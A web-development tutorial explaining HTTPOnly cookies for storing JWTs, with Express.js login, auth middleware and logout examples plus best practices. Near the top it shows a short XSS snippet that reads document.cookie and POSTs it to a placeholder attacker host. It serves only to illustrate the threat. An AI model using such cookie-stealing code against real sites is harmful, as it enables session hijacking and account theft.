# HTTPOnly Cookie

## What is HTTPOnly?

HTTPOnly is a **security flag** for cookies that prevents JavaScript from accessing the cookie via `document.cookie`.

## Why It Matters

### Security Benefits
- **Prevents XSS attacks** - Malicious scripts can't steal the cookie
- **Protects sensitive data** - JWT tokens are safe from client-side JavaScript
- **Defense in depth** - Adds a layer of protection even if XSS vulnerabilities exist

### The Problem Without HTTPOnly
```javascript
// Attacker's injected script can steal your JWT:
const token = document.cookie; // Can access JWT!
fetch('https://attacker.com/steal', { 
  method: 'POST', 
  body: token 
});
```

### With HTTPOnly
```javascript
// Attacker's script is blocked:
const token = document.cookie; // JWT not accessible!
// Returns empty or only non-HTTPOnly cookies
```

## How to Use with JWT

### Setting HTTPOnly Cookie (Backend)

**Express.js Example:**
```javascript
const jwt = require('jsonwebtoken');

// Login route
app.post('/login', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  
  // Create JWT
  const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET);
  
  // Set HTTPOnly cookie
  res.cookie('token', token, {
    httpOnly: true,      // Prevents JavaScript access
    secure: true,        // Only sent over HTTPS
    sameSite: 'strict',  // CSRF protection
    maxAge: 24 * 60 * 60 * 1000  // 24 hours
  });
  
  res.json({ message: 'Logged in successfully' });
});
```

### Reading HTTPOnly Cookie (Backend)

```javascript
const cookieParser = require('cookie-parser');
app.use(cookieParser());

// Authentication middleware
const authenticate = (req, res, next) => {
  const token = req.cookies.token;  // Access cookie server-side
  
  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.userId = decoded.userId;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Protected route
app.get('/profile', authenticate, (req, res) => {
  res.json({ userId: req.userId });
});
```

### Frontend Usage

```javascript
// No need to manually handle the token!
// Browser automatically sends cookie with requests

// Login
fetch('/login', {
  method: 'POST',
  credentials: 'include',  // Important: sends cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password })
});

// Access protected route
fetch('/profile', {
  credentials: 'include'  // Cookie sent automatically
});

// Logout
fetch('/logout', {
  method: 'POST',
  credentials: 'include'
});
```

### Logout (Backend)

```javascript
app.post('/logout', (req, res) => {
  res.clearCookie('token');
  res.json({ message: 'Logged out successfully' });
});
```

## HTTPOnly vs localStorage

| Feature | HTTPOnly Cookie | localStorage |
|---------|----------------|--------------|
| XSS Protection | ✅ Protected | ❌ Vulnerable |
| JavaScript Access | ❌ No | ✅ Yes |
| Auto-sent with requests | ✅ Yes | ❌ Manual |
| CSRF Risk | ⚠️ Higher (use SameSite) | ✅ Lower |
| Storage Limit | ~4KB | ~5-10MB |

## Best Practices

1. **Always use HTTPOnly for JWTs** - Prevents XSS token theft
2. **Combine with Secure flag** - Only send over HTTPS
3. **Add SameSite attribute** - Prevents CSRF attacks
4. **Set appropriate expiration** - Use `maxAge` or `expires`
5. **Use credentials: 'include'** - In fetch requests to send cookies

## Common Pitfall

```javascript
// ❌ BAD - Storing JWT in localStorage
localStorage.setItem('token', jwt);
// Vulnerable to XSS attacks!

// ✅ GOOD - HTTPOnly cookie (set by server)
res.cookie('token', jwt, { httpOnly: true, secure: true });
```

## Summary

HTTPOnly cookies are the **secure way to store JWTs** in web applications. They prevent JavaScript access, protecting against XSS attacks while automatically being sent with requests. Always combine with `secure` and `sameSite` flags for maximum security.
